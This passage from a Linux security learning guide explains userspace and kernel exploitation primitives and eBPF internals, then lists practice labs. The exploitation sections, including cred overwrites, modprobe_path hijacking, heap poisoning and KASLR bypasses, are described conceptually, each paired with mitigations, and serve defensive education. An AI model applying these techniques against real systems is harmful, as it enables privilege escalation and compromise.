| (mmap region: libs,  |
|  shared mappings,    |
|  heap-style mmaps)   |
+----------------------+
| heap (grows up)      |
+----------------------+
| .bss (uninit data)   |
| .data (init data)    |
| .rodata (read-only)  |
| .text (code)         |
+----------------------+ low addresses
```

Each region has different permissions:

- `.text` is typically read+execute, no write
- `.rodata` is read-only
- `.data`, `.bss`, heap, stack are read+write, no execute (with NX/W^X)
- shared library code is read+execute
- the GOT is read+write unless RELRO marks it read-only later

Understanding which region holds what is the start of all exploitation reasoning.

### 3. ELF Format And Loading

ELF (Executable and Linkable Format) is how Linux binaries are stored on disk and parsed at load time.

Important pieces:

- ELF header: magic bytes, target machine, entry point, program header offset
- program headers: tell the loader which segments to map and with what permissions
- section headers: more granular info used by the linker and debuggers
- dynamic section: tells the dynamic linker about libraries, symbols, and relocations
- `.interp`: usually points to `/lib64/ld-linux-x86-64.so.2`, the dynamic linker

When you run a dynamically linked binary, the kernel loads it, the dynamic linker maps shared libraries, processes relocations, then jumps to the entry point.

### 4. Linker, Dynamic Linker, GOT, And PLT

The Global Offset Table (GOT) and Procedure Linkage Table (PLT) are how dynamically linked code calls into shared libraries.

Mental model:

- `.plt` contains stub code: "jump to whatever address is in the matching GOT slot"
- `.got.plt` contains pointers to the resolved library functions
- on the first call, the GOT slot points back into a resolver that fills it with the real library address (lazy binding)
- on subsequent calls, the call goes straight to the library

Why this matters for security:

- if an attacker can write to a GOT slot, they redirect every future call to that function
- GOT overwrite was a classic primitive before RELRO became common
- understanding GOT/PLT helps you read exploit writeups and tools like `objdump -d`, `readelf -r`, and `gdb`

### 5. Calling Conventions And Stack Frames

On Linux x86-64, the System V AMD64 ABI passes the first six integer args in `rdi, rsi, rdx, rcx, r8, r9`, the return value in `rax`, and the return address on the stack. The stack grows down, the frame pointer is `rbp`, the stack pointer is `rsp`.

A typical stack frame:

```text
| args passed via stack    |
| return address           |
| saved rbp                |  <- rbp
| local variables          |
| saved registers          |
| ...                      |  <- rsp
```

Why it matters:

- a stack overflow can corrupt saved registers, saved rbp, and the return address
- ROP works by chaining return addresses to small "gadgets" that end in `ret`
- understanding frames is the foundation for understanding ROP, JOP, and SROP

### 6. The Classic Stack Overflow Story

The historical evolution of stack-overflow exploitation is the cleanest tour of mitigations.

1. **Plain shellcode** — write past the buffer, overwrite the return address with a stack address, place shellcode in the buffer, jump to it. Mitigated by NX/DEP making the stack non-executable.
2. **Return-to-libc** — instead of jumping to shellcode, set up the stack so `ret` enters `system("/bin/sh")` in libc. Mitigated by ASLR (the address of `system` is randomized).
3. **Information leak + ret2libc** — first leak a libc address (via format string, GOT read, etc.), then compute libc base, then ret2libc. ASLR randomizes the offset of the library, but the offset of `system` *within* libc is fixed per build.
4. **ROP (Return Oriented Programming)** — chain many small gadgets ending in `ret`, executing arbitrary computation without injecting code. Mitigated partially by stack canaries and CFI.
5. **JOP / COP (Jump/Call Oriented Programming)** — variants that use indirect jumps or calls instead of `ret`, used when CFI or shadow stacks block ROP.
6. **SROP (Sigreturn Oriented Programming)** — abuse `sigreturn` to set all registers from a fake signal frame on the stack.

Each mitigation forced a more expensive technique. Together they make stack overflows far less casually exploitable than they were.

### 7. Stack Canaries In Detail

A stack canary is a value placed between local variables and the saved return address. The function checks the canary on return; if it changed, the program aborts.

Important properties:

- the canary is randomized per process (often containing a null byte to defeat string copies)
- thread-local storage holds the master copy
- `__stack_chk_fail` is the abort path
- canaries help against linear stack overflows but not against arbitrary writes that skip the canary

### 8. NX, ASLR, PIE, RELRO, Fortify Source

- **NX / DEP / W^X**: pages are either writable or executable, not both. Defeats injecting shellcode into data.
- **ASLR**: randomizes stack, heap, mmap, and library addresses. Defeats hard-coded addresses.
- **PIE (Position Independent Executable)**: the main executable itself is also loaded at a randomized base. Without PIE, the binary's own `.text` and GOT are at fixed addresses even with ASLR.
- **RELRO**: marks parts of the GOT read-only after dynamic linker setup. "Partial RELRO" protects `.got` but not `.got.plt`. "Full RELRO" protects both, at the cost of disabling lazy binding.
- **Fortify Source (`_FORTIFY_SOURCE`)**: compile-time and runtime checks that swap dangerous libc functions (`strcpy`, `memcpy`, `sprintf`) for bounded variants when the compiler can determine sizes.

The `checksec` tool (or `pwntools.elf.ELF.checksec`) inspects a binary and tells you which of these are enabled.

### 9. Format String Vulnerabilities

`printf`-family functions interpret their first argument as a format string. If user input becomes that argument directly, the attacker controls the parser.

Why this is severe:

- `%x`, `%p` leak stack contents
- `%s` dereferences a pointer the attacker may control
- `%n` writes the byte-count-so-far to a pointer the attacker controls

A single `printf(user_input)` is therefore both an arbitrary read and an arbitrary write primitive.

Mitigations:

- compilers warn on non-literal format strings (`-Wformat-security`)
- Fortify Source rejects `%n` to writable memory in some configurations
- the cure is "always use `printf("%s", user_input)`"

### 10. Heap Internals: glibc ptmalloc

Heap exploitation requires understanding the allocator, because the bug interacts with allocator metadata.

glibc's allocator (ptmalloc, derived from dlmalloc) maintains free chunks in several lists:

- **fastbins**: small same-size singly-linked LIFO lists
- **tcache** (per-thread cache): faster small-allocation cache, also LIFO
- **smallbins** and **largebins**: doubly-linked lists by size
- **unsorted bin**: a holding area for recently freed chunks before they are sorted

Each chunk has a header with size, flags (PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA), and (for free chunks) forward/backward pointers stored in what was the user data area.

Key invariants the allocator relies on:

- a free chunk's size matches the next chunk's "prev_size"
- a free chunk's pointers reference other valid chunks
- chunks are aligned and sized in multiples

If a bug breaks any of these, the allocator can be tricked.

### 11. Heap Bug Classes

- **Heap overflow** — write past the end of a chunk into the next chunk's header or pointers.
- **Use-after-free** — keep using a freed chunk; the allocator may hand out the same memory to another caller.
- **Double free** — freeing the same chunk twice can poison free lists. Modern glibc has tcache double-free checks, but they have been bypassed historically.
- **Off-by-one (poison-null-byte)** — a single null byte overflow can corrupt the next chunk's size, leading to overlap.

### 12. Heap Exploitation Techniques (Defensively Named)

You will encounter these names in writeups. Each describes a way to abuse a heap bug into a useful primitive.

- **tcache poisoning**: corrupt a tcache entry's `next` pointer so the allocator hands out an arbitrary address as the next allocation. Result: arbitrary write where you can also choose an allocation site.
- **fastbin attack**: similar idea on fastbins.
- **unsorted bin attack**: leverage the unsorted bin's pointer manipulation to write a libc address into a target location.
- **House of Force / House of Spirit / House of Orange / House of Botcake**: named techniques for various allocator-state corruptions. Each was a response to particular hardening.
- **One-gadget**: a single address inside libc where calling it spawns a shell, given certain register/stack constraints. The `one_gadget` tool finds these in a libc.

For DevSecOps, the takeaway is not to memorize each technique. It is to recognize that "heap bug" usually means "with enough effort, arbitrary read/write." Modern hardening (`MALLOC_CHECK_`, safe-linking, tcache key, glibc 2.34+ checks) raises the bar but does not close the door.

### 13. Use-After-Free In Userspace

UAF in userspace works the same way it does in the kernel:

1. allocate object A
2. free A
3. allocator hands the same memory to a different object B
4. code still using a stale pointer to A now reads or writes B

If A had a vtable pointer (C++) or a function pointer, controlling B's contents redirects calls. This is why JavaScript engine and browser exploits live and die by UAFs.

### 14. Race Conditions And TOCTOU In Userspace

Userspace races mirror kernel races:

- check file ownership, then open it — but the file changes between check and open (TOCTOU)
- two threads share a counter without synchronization
- a signal handler runs reentrantly during a non-async-signal-safe operation

Symbolic links, `/tmp` files with predictable names, and shared memory are classic TOCTOU venues. Always prefer `*at` syscalls (`openat`, `unlinkat`) and `O_NOFOLLOW` to avoid path-resolution races.

### 15. Setuid Binaries And Privilege Boundaries

A setuid binary runs as the file owner regardless of who launched it. If the binary has a memory bug, exploiting it gives the attacker the owner's privileges (often root).

Why this matters operationally:

- `find / -perm -4000 -type f` lists setuid binaries
- minimize them, especially custom ones
- setuid binaries also disable some library features (`LD_PRELOAD` is ignored for security) and trigger `AT_SECURE` in the dynamic loader

This connects to capabilities: capabilities are how Linux replaces "must be root" with finer-grained privileges, reducing the impact of exploited binaries.

### 16. Sandboxing And Hardening For Applications

Modern Linux gives applications several ways to constrain themselves:

- seccomp filters: drop the right to call dangerous syscalls
- Landlock: restrict filesystem access from inside the process
- pledge / unveil-style approximations on Linux via seccomp + Landlock
- systemd unit hardening (`NoNewPrivileges`, `ProtectSystem`, `ProtectHome`, `PrivateTmp`, `SystemCallFilter`, `RestrictAddressFamilies`)
- AppArmor or SELinux profiles

These are defensive programming primitives. They do not stop a bug, but they shrink what an exploit can do once triggered.

### 17. Tooling Vocabulary

You will see these tools constantly. You do not need expert proficiency, but you should recognize what each one is for.

- **gdb / pwndbg / gef**: interactive debuggers with exploit-oriented plugins
- **pwntools** (Python): the standard scripting library for crafting and delivering exploits, also useful for log replay and parser fuzzing
- **ROPgadget / ropper**: scan a binary or library for ROP gadgets
- **one_gadget**: find single-call shell-spawning addresses in a libc
- **checksec**: report which mitigations a binary has enabled
- **patchelf**: rewrite ELF interpreter and rpath, useful in lab setups
- **ltrace / strace**: trace library and syscall calls of a running program
- **objdump / readelf / nm**: static binary inspection
- **radare2 / Cutter / Ghidra / Binary Ninja / IDA**: reverse engineering frameworks
- **AFL++ / libFuzzer / honggfuzz**: coverage-guided fuzzers for finding bugs
- **AddressSanitizer (ASan)**: userspace sanitizer that catches out-of-bounds and UAF; the userspace cousin of KASAN
- **valgrind**: dynamic analysis, slower but catches uninitialized memory and leaks

### 18. From Userspace To Kernel: What Carries Over

Almost every concept in this chapter has a kernel analogue:

| Userspace                    | Kernel                                |
| ---                          | ---                                   |
| ASLR                         | KASLR                                 |
| stack canary                 | kernel stack canary                   |
| NX                           | kernel W^X, executable-only `.text`   |
| RELRO (read-only GOT)        | read-only kernel data, `__ro_after_init` |
| heap (ptmalloc)              | slab (SLUB)                           |
| tcache poisoning             | slab freelist poisoning               |
| ASan                         | KASAN                                 |
| seccomp                      | seccomp (same, applied per-task)      |
| GOT overwrite                | function-pointer-table overwrite      |
| ret2libc                     | "ret2usr" classically, mitigated by SMEP/PXN |

The biggest difference is privilege. A kernel exploit typically converts a userspace attacker into kernel-level capability, and the mitigations (KPTI, SMEP, SMAP, CFI, BPF lockdown) are tuned to that gap.

### 19. A Suggested Practice Path

If you want to actually internalize this chapter, the practical path is:

1. Solve a few CTF-style stack-overflow challenges with NX off, then on.
2. Solve a ret2libc challenge once with ASLR off, then with ASLR on plus a leak.
3. Build a simple ROP chain with `pwntools` and `ROPgadget`.
4. Read about format-string write primitives, then write a `%n`-based exploit on a deliberately vulnerable binary.
5. Read one tcache or fastbin writeup carefully — `how2heap` from Shellphish is a popular reference set.
6. Write a small fuzz harness with libFuzzer or AFL++ for a parser you control.

These are skills, not policy positions. Doing them on lab VMs you own is normal security education. Doing them on systems you do not own is not.

## Part 29: Concrete Kernel Exploitation Techniques (Defensively)

**Level: Advanced → Expert.** Each section names a real technique used in published exploits and walks through what it does and how it is defended against. Read this Part *after* Parts 5, 8, 9, and 28.

**Beginner sidebar.** If you are not yet at Advanced level, skim this Part for the names (`cred` overwrite, `modprobe_path`, Dirty Pipe, `msg_msg` spray, KASLR bypass) and revisit it later. Knowing the names is enough to read most CVE writeups.

This chapter pairs with Part 28. After learning userspace primitives, the kernel-side techniques become much easier to recognize. Everything here is defensively framed: the goal is to recognize the moves so you can detect, mitigate, or harden against them.

### 1. The Credential Structure (`struct cred`)

Every task carries a `cred` structure that holds its UIDs, GIDs, capability sets, and security label. The kernel uses this for permission checks.

If an attacker gains arbitrary kernel write, the historical "easiest win" is to overwrite the current task's `cred` so its UID and GID are zero and all capability sets are full. Functionally, this turns the process into root.

Why this technique is famous:

- it does not require redirecting control flow
- it bypasses CFI and SMEP entirely (it is pure data corruption)
- it is short and reliable once a write primitive exists

Defenses:

- **CONFIG_HARDENED_USERCOPY** and similar — make wild copies harder
- **kCFI** — control-flow integrity (limited help here since this is data-only)
- some hardening efforts move credentials into protected memory or randomize layout

This is also why "data-only kernel exploitation" is a common modern phrase. Once you can write four bytes into the right place, you may not need any more sophistication.

### 2. modprobe_path And core_pattern

Two strings in the kernel are powerful by themselves:

- `modprobe_path`: the kernel runs this path as root when an unknown module is needed. Default: `/sbin/modprobe`.
- `core_pattern`: when a process crashes, the kernel may pipe the core dump to a program named here, run as root. Defaults vary by distro.

A kernel arbitrary write can change either string to a path the attacker can drop a script at. Then triggering the right event (loading a fake module, or crashing a setuid program) runs the script as root.

Defenses:

- modern kernels mark these `__ro_after_init` or otherwise harden them on many distros
- `kernel.modules_disabled=1` can lock module loading entirely
- `proc.sys.kernel.core_pattern` can be locked or set to something safe (`|/bin/false`)

When you read kernel hardening guides recommending `kernel.modules_disabled=1` for production, this is one of the reasons.

### 3. Pipe Buffer And `pipe_buffer->ops`

`pipe_buffer` is the kernel structure backing a pipe. It contains an `ops` field (a function-pointer table) and reference counts. The "Dirty Pipe" CVE-2022-0847 family showed how a flag-handling bug could let an unprivileged user write into pages that should have been read-only — including SUID binaries on disk via the page cache.

The general pattern is broader than one CVE:

- pipes are easy for unprivileged code to allocate
- `pipe_buffer` objects are useful spray targets
- their `ops` pointer is a juicy control-flow target if you can corrupt one

Defenses focus on validating flags, marking ops tables read-only, and reducing the gap between intended and actual buffer ownership semantics.

### 4. `msg_msg` And SysV IPC Spraying

`msg_msg` is the kernel structure that holds a SysV IPC message. It is attractive to exploit authors because:

- you can request many of them, with controllable size and content
- they live in heap caches that are reachable from unprivileged code
- their headers contain pointers and sizes that, if corrupted, become useful primitives

You will see "msg_msg spray" in many recent kernel writeups. Hardening (slab cache isolation, `CONFIG_SLAB_VIRTUAL`, cgroup memcg accounting) reduces this technique's reliability but does not eliminate the family.

### 5. `struct file`, `struct sock`, And vtable-Like Tables

Many kernel objects contain pointers to operations tables (`file_operations`, `inode_operations`, `proto_ops`, `tty_operations`). Corrupting the pointer to such a table — or the table itself, if it is writable — gives a control-flow primitive on the next operation.

Hardening:

- `__ro_after_init` for ops tables
- `const` qualifiers and read-only data sections
- CFI (kCFI / Clang CFI) restricts the set of valid call targets, raising the bar even when the pointer is corruptible
- FineIBT on x86 adds hardware-assisted indirect branch tracking

### 6. userfaultfd And FUSE: Race Window Widening

A famous category of kernel exploits depends on a tiny race window. `userfaultfd` (a syscall that lets a userspace process handle page faults for its own memory) and FUSE (filesystems implemented in userspace) historically allowed userspace to *pause* the kernel mid-operation by faulting at the right moment.

Why this matters:

- a 100-nanosecond window becomes effectively unlimited if userspace controls when the fault returns
- many otherwise impractical races become reliable

Defenses:

- `vm.unprivileged_userfaultfd=0` (or kernel config) restricts userfaultfd to privileged callers
- containers should consider whether FUSE is needed; if not, deny the relevant capabilities
- recent kernels added `userfaultfd_unprivileged` controls and reduced what unprivileged userfaultfd can do

### 7. KASLR Bypasses And Info Leaks

KASLR only helps if the layout stays unknown. Common defeat strategies:

- **kernel pointer leak via `dmesg`** when kptr_restrict is permissive
- **leaks via `/proc`** files (`/proc/kallsyms`, `/proc/modules`, `/proc/<pid>/stat` on older kernels)
- **side channels**: prefetch, TLB, branch predictor, L1TF, Meltdown-style speculative reads
- **uninitialized memory leaks** from any of the bug classes in Part 8

Hardening:

- `kernel.dmesg_restrict=1`
- `kernel.kptr_restrict=2`
- KPTI to mitigate Meltdown
- ongoing Spectre family mitigations (retpoline, IBRS, IBPB, eIBRS)

### 8. SMEP, SMAP, PXN, PAN — And How They Are Bypassed Conceptually

- **SMEP (x86)**: kernel cannot execute pages with the user bit set. Stops "ret2usr" classic style.
- **SMAP (x86)**: kernel cannot read or write user pages without explicit `stac`/`clac`. Stops naive userland-buffer abuse.
- **PXN, PAN (ARM)**: ARM equivalents.

Exploit authors respond by:

- staying inside the kernel (ROP using kernel gadgets, data-only attacks)
- finding code paths where SMAP is temporarily disabled
- corrupting kernel objects rather than dereferencing user pointers

For defenders, these features are valuable not because they are unbeatable but because they cut off easy wins. The remaining techniques require more bug, more leak, or more luck.

### 9. BPF As An Exploitation Surface (Yes, Really)

Earlier you learned eBPF as a defensive tool. Historically, BPF has also been an exploitation surface — the verifier is complex and a verifier bug means attacker-controlled code runs with kernel privileges.

This is why:

- `kernel.unprivileged_bpf_disabled=1` is a common hardening recommendation
- modern distros split bpf permissions into `CAP_BPF`
- BPF lockdown modes restrict what BPF can do at runtime

When you grant BPF, you grant a powerful capability. Treat it accordingly.

### 10. Practical Defensive Sysctls And Configs

A short list of sysctls and configs that materially reduce kernel exploit reliability on a production node:

- `kernel.kptr_restrict=2`
- `kernel.dmesg_restrict=1`
- `kernel.unprivileged_bpf_disabled=1`
- `kernel.unprivileged_userfaultfd=0`
- `kernel.modules_disabled=1` after boot, where feasible
- `kernel.yama.ptrace_scope=2` or `3`
- `kernel.perf_event_paranoid=3`
- `vm.mmap_min_addr` set to a non-trivial value (4096 or higher)
- `fs.protected_symlinks=1`, `fs.protected_hardlinks=1`, `fs.protected_fifos=2`, `fs.protected_regular=2`
- enabling lockdown mode (`integrity` or `confidentiality`) when secure boot is in use

These do not prevent every exploit, but they raise the baseline cost and noise of compromise.

## Part 30: Deep eBPF

**Level: Advanced.** Builds on Part 14 with full program-type and map-type catalogs, helpers, verifier internals, and toolchains. Read after Part 14 has settled.

**Beginner sidebar.** A good way to use this Part: pick one program type (start with tracepoint or fentry) and one map type (start with ring buffer), and trace those names through the rest of the chapter. Trying to absorb every program type at once is overwhelming and unnecessary.

This chapter expands on Part 14 with the program types, helpers, and tooling you will encounter in any serious eBPF work.

### 1. eBPF Program Types

Each program type has its own attach mechanism, context object, and set of allowed helpers. The verifier checks programs against the rules of their type.

The most common types you will meet:

- **`BPF_PROG_TYPE_KPROBE`**: attach to kernel function entry or return via kprobe/kretprobe
- **`BPF_PROG_TYPE_TRACEPOINT`**: attach to static kernel tracepoints (more stable than kprobes)
- **`BPF_PROG_TYPE_RAW_TRACEPOINT`** and `BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE`: lower-overhead tracepoint variant exposing raw arguments
- **`BPF_PROG_TYPE_PERF_EVENT`**: attach to perf events (sampling, hardware counters)
- **`BPF_PROG_TYPE_TRACING`** with `fentry`/`fexit`/`fmod_ret`: BPF trampolines for very low-overhead function tracing on functions registered with BTF
- **`BPF_PROG_TYPE_LSM`**: attach to LSM hooks for policy enforcement (BPF LSM)
- **`BPF_PROG_TYPE_XDP`**: very early packet processing in the driver, used for high-performance packet filtering and DDoS mitigation
- **`BPF_PROG_TYPE_SCHED_CLS`** / `BPF_PROG_TYPE_SCHED_ACT`: tc-based packet processing
- **`BPF_PROG_TYPE_CGROUP_SKB`** / `BPF_PROG_TYPE_CGROUP_SOCK_*`: per-cgroup network policy
- **`BPF_PROG_TYPE_SOCKET_FILTER`**: classic packet-filter behavior
- **`BPF_PROG_TYPE_SK_SKB`** / `BPF_PROG_TYPE_SOCK_OPS` / `BPF_PROG_TYPE_SK_MSG`: socket-level redirection and policy, used by Cilium
- **`BPF_PROG_TYPE_KPROBE` with `uprobe`**: trace userspace functions

For security observability, tracepoints, raw tracepoints, fentry/fexit, LSM, and uprobes cover almost every realistic detection use case.

### 2. eBPF Map Types

Maps are how programs keep state and communicate with userspace. Each type has tradeoffs.

Most-used types:

- **`BPF_MAP_TYPE_HASH`**: classic key/value
- **`BPF_MAP_TYPE_LRU_HASH`**: hash that evicts least-recently-used entries when full — useful for caches
- **`BPF_MAP_TYPE_ARRAY`**: index-keyed array, fast
- **`BPF_MAP_TYPE_PERCPU_ARRAY`** / **`BPF_MAP_TYPE_PERCPU_HASH`**: per-CPU variants. Higher throughput, looser semantics (no atomic global view).
- **`BPF_MAP_TYPE_RINGBUF`**: lockless multi-producer event channel to userspace. Preferred over perf buffer for new code.
- **`BPF_MAP_TYPE_PERF_EVENT_ARRAY`**: older event channel based on perf
- **`BPF_MAP_TYPE_STACK_TRACE`**: stack trace storage, used for profiling and call-stack capture in detections
- **`BPF_MAP_TYPE_PROG_ARRAY`**: program array used for tail calls
- **`BPF_MAP_TYPE_LPM_TRIE`**: longest-prefix match, used for IP routing/policy
- **`BPF_MAP_TYPE_SK_STORAGE`** / **`BPF_MAP_TYPE_TASK_STORAGE`** / **`BPF_MAP_TYPE_INODE_STORAGE`** / **`BPF_MAP_TYPE_CGROUP_STORAGE`**: per-object local storage. Often the right choice for security tools that need state per task or per socket.
- **`BPF_MAP_TYPE_QUEUE`** / **`BPF_MAP_TYPE_STACK`**: producer-consumer queues
- **`BPF_MAP_TYPE_BLOOM_FILTER`**: probabilistic membership

A common detection-engineering pattern: per-task storage for fast lookup ("is this task suspicious?"), ring buffer for events, LRU hash for noisy keys you want to dedupe.

### 3. Helpers

eBPF programs cannot call arbitrary kernel functions. They call **helpers** — kernel functions explicitly exposed to BPF. There are hundreds. Categories you will use:

- **map ops**: `bpf_map_lookup_elem`, `bpf_map_update_elem`, `bpf_map_delete_elem`, `bpf_ringbuf_reserve`/`submit`/`output`
- **task and process info**: `bpf_get_current_pid_tgid`, `bpf_get_current_uid_gid`, `bpf_get_current_comm`, `bpf_get_current_task` (returns a `struct task_struct *` that you can read with CO-RE)
- **time**: `bpf_ktime_get_ns`, `bpf_ktime_get_boot_ns`
- **memory access**: `bpf_probe_read_kernel`, `bpf_probe_read_user`, `bpf_probe_read_kernel_str`, `bpf_probe_read_user_str` — verified, fault-safe reads. The legacy `bpf_probe_read` is deprecated; modern code should use the explicit kernel/user variants.
- **printk-style debug**: `bpf_printk`, `bpf_trace_printk` — useful in development, must be kept out of hot paths in production
- **packet ops** (network programs): `bpf_skb_*`, `bpf_xdp_*`, redirect helpers
- **kfuncs**: kernel functions explicitly registered as callable from BPF, an evolving alternative to fixed helpers

### 4. The Verifier In More Depth

The verifier is essentially a static analyzer that simulates every reachable path in the program and tracks:

- register types and value ranges
- pointer types (PTR_TO_CTX, PTR_TO_MAP_VALUE, PTR_TO_PACKET, PTR_TO_STACK, PTR_TO_BTF_ID, ...)
- bounds on offsets within those pointers
- whether values are tainted by user input
- whether locks held are released, refcounts balanced, etc.

It rejects programs that:

- can read or write out of bounds
- can dereference an unknown pointer
- have unbounded loops (recent kernels allow bounded loops, and "iterators" allow some patterned loops)
- exceed instruction-count limits
- call helpers not allowed for the program's type

When you write eBPF and the verifier rejects it, it returns a long log explaining where it lost track. That log is your friend — read it carefully. Many "this program won't load" frustrations are about helping the verifier see bounds it cannot infer.

### 5. JIT, Tail Calls, And BPF-To-BPF Calls

The kernel JIT-compiles eBPF bytecode into native machine code on supported architectures. JITed BPF runs at near-C speed.

Two ways to factor large programs:

- **tail calls** via `BPF_MAP_TYPE_PROG_ARRAY`: jump from one BPF program to another (no return). Limited stack continuity.
- **BPF-to-BPF calls**: ordinary function calls within a program object. Modern kernels support this.

Tail calls are useful for type dispatching (e.g., one program per syscall family). BPF-to-BPF is preferred for normal modular code.

### 6. CO-RE And BTF, In More Depth

CO-RE (Compile Once, Run Everywhere) makes a single eBPF program object work across kernels with different struct layouts.

The pieces:

- **BTF (BPF Type Format)**: compact type information, embedded in the kernel and in eBPF objects
- **CO-RE relocations**: the compiler emits markers like "the offset of `task_struct->cred`"; libbpf rewrites these at load time using the running kernel's BTF
- **`bpf_core_read`** / **`BPF_CORE_READ`** macros: helpers that perform CO-RE-relocated reads

Without BTF in the running kernel (very old or stripped builds), CO-RE will not work and tools fall back to per-kernel rebuilds or BTFhub-style external BTF.

### 7. BPF LSM

BPF LSM lets you write enforcement policy as eBPF attached to LSM hooks. Hooks include things like `bprm_check_security` (about-to-exec), `inode_create`, `socket_connect`, `task_alloc`, and many more. Returning nonzero from your BPF LSM program denies the operation.

This makes BPF a real enforcement surface, not just observation. Tetragon, KubeArmor, and parts of Cilium use BPF LSM for runtime enforcement.

### 8. Loaders And Toolchains

You almost never load eBPF "by hand." You use a loader.

The major options:

- **libbpf** (C): the canonical loader, bundled with the kernel source. Modern code uses libbpf-skeletons (compile-time generated headers that expose your maps and programs as structs).
- **cilium/ebpf** (Go): pure-Go eBPF library used by Cilium, Tetragon, and many DevSecOps tools written in Go. MiLog uses this style.
- **aya** (Rust): mature Rust eBPF framework. Cornela uses this style.
- **bcc** (Python wrapper around clang-driven JIT compilation): older, runtime-compiles BPF on the host. Heavier and less portable; many bcc tools have moved to libbpf.
- **bpftrace**: a high-level scripting language for ad-hoc tracing, like awk for the kernel. Excellent for investigation and prototyping.

### 9. `bpftool`

`bpftool` is the official Swiss army knife for BPF. Things it does:

- list loaded programs and maps (`bpftool prog list`, `bpftool map list`)
- dump program bytecode and JITed code (`bpftool prog dump xlated id N`, `... jited id N`)
- inspect, dump, and modify maps (`bpftool map dump id N`)
- pin and unpin objects in bpffs
- generate BPF skeletons from object files (`bpftool gen skeleton`)
- inspect BTF (`bpftool btf dump file vmlinux format c` to produce a `vmlinux.h`)
- inspect cgroup attachments and net attachments

It is the first tool to reach for when "is the BPF program even loaded and attached?" is the question.

### 10. bpftrace

`bpftrace` is to BPF what `awk` and `dtrace` are to text and Solaris. It compiles short scripts into eBPF programs.

A few illustrative one-liners (read, do not necessarily run on production):

```text
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%s %s\n", comm, str(args->filename)); }'
bpftrace -e 'kprobe:do_sys_openat2 { @[comm] = count(); }'
bpftrace -e 'tracepoint:sched:sched_process_exec { @[args->filename] = count(); }'
```

It is excellent for:

- ad-hoc investigation
- prototyping a detection idea before writing production eBPF
- on-call situations when you need a runtime question answered now

### 11. Production-Quality eBPF Projects To Read

Reading other people's eBPF is one of the best ways to learn. A few well-known projects worth studying:

- **bcc-tools** and **bpftrace tools**: short, focused scripts (`opensnoop`, `execsnoop`, `tcpconnect`, `runqlat`)
- **Cilium**: networking and policy, very large eBPF surface
- **Tetragon** (Cilium's runtime security tool): eBPF + policy DSL, useful pattern study
- **Tracee** (Aqua Security): runtime detection in Go using cilium/ebpf
- **Falco**: detection rules; modern Falco can use eBPF as a backend
- **kubectl-trace**: bpftrace inside Kubernetes
- **Pixie**: observability platform with heavy eBPF use
- **Parca**: continuous profiling with eBPF

### 12. eBPF Performance And Safety Caveats

Two reminders that production eBPF authors learn fast:

- **Hot paths matter.** A program that runs on every packet or every sched_switch must do almost nothing. Profile your eBPF.
- **The verifier is your friend.** Fight it less, work with it more. Bound your loops, check pointer offsets, prefer per-CPU and ring buffer over global state, prefer `BPF_CORE_READ` over manual offset arithmetic.
- **Lockdown and signing.** Some environments require signed BPF, restrict unprivileged BPF, or run in lockdown mode. Plan for that.
- **Kernel version matters.** Test on the oldest kernel you ship to. Helpers, map types, and program types appear over many releases.

## Part 31: Tooling, Labs, And Practice

**Level: Beginner → Advanced.** Each section is independently usable. Beginners can skip the kernel-build instructions; advanced readers can skip the basic VM setup. Do not skip the practice cadence at the end — it works.

Reading is not enough. You need a lab and a practice routine. This chapter is a short, opinionated guide.

### 1. A Disposable Linux Lab

A safe, reproducible lab is the most important investment.

Two good options:

- **A local VM** (multipass, libvirt/virt-manager, lima, UTM on Apple silicon, VirtualBox). Snapshot before risky work, revert after.
- **QEMU + a kernel you build yourself**. Boots in seconds, easy to crash and revert. Ideal for kernel learning.

Minimum lab capabilities you want:

- root access
- ability to install kernel headers and matching kernel
- a working build toolchain (`gcc`, `clang`, `make`, kernel build deps)
- networking but isolated from production
- snapshot/revert

### 2. Building And Running Your Own Kernel

A modern Linux kernel builds in tens of minutes on a laptop. Doing it once teaches you more than weeks of reading.

Approximate path:

```text
git clone --depth=1 https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
cd linux
make defconfig
# enable debug + KASAN + KFENCE if you can spare the cycles
make -j$(nproc)
qemu-system-x86_64 -kernel arch/x86/boot/bzImage -append "console=ttyS0" -nographic ...
```

Configurations worth exploring:

- `CONFIG_DEBUG_KERNEL=y`, `CONFIG_KASAN=y`, `CONFIG_UBSAN=y` for detection
- `CONFIG_DEBUG_INFO_BTF=y` for CO-RE
- `CONFIG_BPF_SYSCALL=y`, `CONFIG_BPF_LSM=y`, `CONFIG_DEBUG_INFO=y`
- `CONFIG_KGDB=y`, `CONFIG_GDB_SCRIPTS=y` if you want to attach gdb

### 3. ftrace, perf, And tracecmd

Before reaching for eBPF, learn the older Linux tracing infrastructure. Many problems are solved faster with these.

- **ftrace** (`/sys/kernel/tracing/`): function tracer, function graph tracer, event tracing. The kernel's own built-in tracer.
- **perf**: sampling profiler (`perf top`, `perf record`, `perf report`), event counter, tracepoint reader (`perf trace`), schedule analysis (`perf sched`).
- **trace-cmd**: a friendlier wrapper around ftrace for recording and analyzing traces.

Reading kernel call paths in `perf record -g` then `perf report` is one of the fastest ways to teach yourself how the kernel actually behaves.

### 4. strace, ltrace, sysdig

For userspace and syscall investigation:

- **strace**: trace syscalls of one program (`strace -f -o out.txt ./bin`)
- **ltrace**: trace library calls (less reliable on modern systems but still useful)
- **sysdig**: a userland system call event recorder, predecessor to Falco

### 5. syzkaller (Defensive Awareness)

`syzkaller` is the upstream kernel's coverage-guided syscall fuzzer. It runs the kernel under sanitizers and pummels it with randomized syscall sequences. Most kernel CVEs of the last several years were found by syzkaller.

You do not need to run it yourself. You should know:

- the kernel CI runs syzkaller continuously
- many CVE descriptions effectively summarize "syzbot crash + analyst writeup"
- this is one reason staying close to upstream stable kernels reduces exposure

### 6. Pwn-Style Practice Sites

For binary exploitation skill:

- **pwn.college** (free, university-grade): the most thorough public curriculum
- **pwnable.kr**, **pwnable.tw**: classic challenge sets, increasing difficulty
- **picoCTF**: gentle on-ramp
- **HackTheBox**, **TryHackMe**: broader CTF-like environments
- **OverTheWire** (`bandit`, `narnia`, `behemoth`): foundational Linux and exploitation challenges
- **Microcorruption**: embedded exploitation in a browser
- **Nightmare** (a free guide that pairs with practice sites)

For kernel exploitation specifically:

- **kernelnewbies.org**: kernel development on-ramp
- **LWN.net**: weekly deep articles, the single best running source on kernel internals
- **xairy/linux-kernel-exploitation** (GitHub): defensive reading list of public kernel exploitation resources
